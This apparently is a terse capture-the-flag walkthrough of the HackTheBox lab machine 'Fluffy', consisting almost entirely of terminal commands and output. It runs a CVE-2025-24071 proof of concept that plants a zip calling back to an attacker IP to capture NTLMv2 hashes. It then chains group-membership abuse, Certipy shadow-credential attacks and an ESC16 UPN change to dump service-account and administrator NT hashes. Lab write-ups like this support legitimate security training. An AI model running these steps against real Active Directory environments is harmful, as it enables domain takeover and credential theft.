

- cve found in pdf
- esc16

```
kali@kali ~> nxc smb 10.10.11.69 -u 'j.fleischman'  -p 'J0elTHEM4n1990!' --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share 
```



```
kali@kali ~> cd CVE-2025-24071_PoC/
kali@kali ~/CVE-2025-24071_PoC (main)> ls
poc.py  README.md
kali@kali ~/CVE-2025-24071_PoC (main)> python poc.py 
Enter your file name: everything.zip
Enter IP (EX: 192.168.1.162): 10.10.14.20
completed
kali@kali ~/CVE-2025-24071_PoC (main)> ls
exploit.zip  poc.py  README.md
kali@kali ~/CVE-2025-24071_PoC (main)> nxc smb 10.10.11.69 -u 'j.fleischman'  -p 'J0elTHEM4n1990!' --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share 

```



```
# put /home/kali/CVE-2025-24071_PoC/exploit.zip
# ls
drw-rw-rw-          0  Fri May 30 19:27:16 2025 .
drw-rw-rw-          0  Fri May 30 19:27:16 2025 ..
drw-rw-rw-          0  Fri May 16 10:51:49 2025 Everything-1.4.1.1026.x64
-rw-rw-rw-    1827464  Fri May 16 10:51:49 2025 Everything-1.4.1.1026.x64.zip
-rw-rw-rw-        336  Fri May 30 19:27:16 2025 exploit.zip
drw-rw-rw-          0  Fri May 16 10:51:49 2025 KeePass-2.58
-rw-rw-rw-    3225346  Fri May 16 10:51:49 2025 KeePass-2.58.zip
-rw-rw-rw-     169963  Sat May 17 10:31:07 2025 Upgrade_Notice.pdf

```


```python
[!] Error starting SSL server on port 636, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:2f12086c6e54c101:7C9AB8D24D5DD1812EA7A8F7AB8C0246:0101000000000000008B93335ED1DB0136AB2839D364FAB700000000020008005A0059003000570001001E00570049004E002D00390045004F004E00510056004400450038005200350004003400570049004E002D00390045004F004E0051005600440045003800520035002E005A005900300057002E004C004F00430041004C00030014005A005900300057002E004C004F00430041004C00050014005A005900300057002E004C004F00430041004C0007000800008B93335ED1DB0106000400020000000800300030000000000000000100000000200000C643D97197DF1D0B50D063A814E7BF30F974EEBF5BEEE5BFEC26A2EDA5176B400A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320030000000000000000000      
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:eca3e3c721580a01:8CA3789F85BB0751656EF68086213156:0101000000000000008B93335ED1DB01854EF351A2B57C4C00000000020008005A0059003000570001001E00570049004E002D00390045004F004E00510056004400450038005200350004003400570049004E002D00390045004F004E0051005600440045003800520035002E005A005900300057002E004C004F00430041004C00030014005A005900300057002E004C004F00430041004C00050014005A005900300057002E004C004F00430041004C0007000800008B93335ED1DB0106000400020000000800300030000000000000000100000000200000C643D97197DF1D0B50D063A814E7BF30F974EEBF5BEEE5BFEC26A2EDA5176B400A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320030000000000000000000      

```



```python
kali@kali ~> bloodyAD --host 10.10.11.69 -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
[+] p.agila added to Service Accounts
```


```python
kali@kali ~> certipy shadow auto -u 'p.agila'@fluffy.htb -p 'prometheusx-303'  -account WINRM_SVC
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f4e97a64-d379-cd70-0f9b-7a2596b6fc8a'
[*] Adding Key Credential with device ID 'f4e97a64-d379-cd70-0f9b-7a2596b6fc8a' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'f4e97a64-d379-cd70-0f9b-7a2596b6fc8a' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```


```python
kali@kali ~ [SIGINT]> certipy shadow auto -u 'p.agila'@fluffy.htb -p 'prometheusx-303'  -account CA_SVC
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '4bc0d5f2-8f0c-6db2-8717-1fac5adfa29b'
[*] Adding Key Credential with device ID '4bc0d5f2-8f0c-6db2-8717-1fac5adfa29b' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '4bc0d5f2-8f0c-6db2-8717-1fac5adfa29b' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```


```python
kali@kali ~> certipy account \
                     -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
                     -dc-ip '10.10.11.69' -user 'winrm_svc' \
                     read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'winrm_svc':
    cn                                  : winrm service
    distinguishedName                   : CN=winrm service,CN=Users,DC=fluffy,DC=htb
    name                                : winrm service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1603
    sAMAccountName                      : winrm_svc
    servicePrincipalName                : WINRM/winrm.fluffy.htb
    userPrincipalName                   : winrm_svc@fluffy.htb
    userAccountControl                  : 4260352
    whenCreated                         : 2025-04-19T11:51:39+00:00
    whenChanged                         : 2025-05-30T23:37:39+00:00

```


```
kali@kali ~> certipy account \
                     -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
                     -dc-ip '10.10.11.69' -upn 'administrator' \
                     -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'


```



```python
kali@kali ~> certipy shadow \
                     -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
                     -dc-ip '10.0.0.100' -account 'winrm_svc' \
                     auto
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:10.0.0.100@53 answered The DNS operation timed out.; Server Do53:10.0.0.100@53 answered The DNS operation timed out.; Server Do53:10.0.0.100@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '8c60863c-c5eb-2198-aa96-f7758bed1243'
[*] Adding Key Credential with device ID '8c60863c-c5eb-2198-aa96-f7758bed1243' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '8c60863c-c5eb-2198-aa96-f7758bed1243' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
File 'winrm_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767

```


```python
kali@kali ~ [1]> certipy account \
                         -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
                         -dc-ip '10.10.11.69' -upn 'ca_svc' \
                         -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc
[*] Successfully updated 'ca_svc'
```


```python
kali@kali ~> certipy auth \
                     -dc-ip '10.10.11.69' -pfx 'administrator.pfx' \
                     -username 'administrator' -domain 'fluffy.htb'
             
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e

```

```

```